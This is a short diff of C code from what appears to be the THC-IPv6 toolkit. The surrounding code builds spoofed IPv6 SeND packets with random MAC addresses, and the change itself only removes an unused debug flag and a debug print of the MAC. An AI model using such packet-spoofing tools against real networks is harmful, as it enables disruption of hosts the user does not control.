@@ -60,7 +60,6 @@ int main(int argc, char **argv) {
   int flags = 0;                /* ICMPv6 flags */
 
 //  thc_ipv6_rawmode(0);          /* generate my own MAC addresses */
-  int debug = 0;                /* debug switch */
   FILE *fp;                     /* file pointer for reading from /dev/urandom */
   unsigned char test[6];        /* randomized mac storage */
   int result = 0, pid, status, i;       /* exit codes */
@@ -154,11 +153,6 @@ int main(int argc, char **argv) {
         exit(1);
       }
       free(cga_opt);
-      if (debug) {
-        printf("%02x:%02x:%02x:%02x:%02x:%02x\n", test[0], test[1], test[2], test[3], test[4], test[5]);
-//        printf("%02x:%02x:%02x:%02x:%02x:%02x\n", dsthw[0], dsthw[1], dsthw[2], dsthw[3], dsthw[4], dsthw[5]);
-        fflush(stdout);
-      }
 
 /* attach the IPv6+ICMPv6+SeND to an Ethernet frame with random MAC */
       if ((result = thc_generate_pkt(dev, test, tgthw, pkt, &pkt_len)) < 0) {
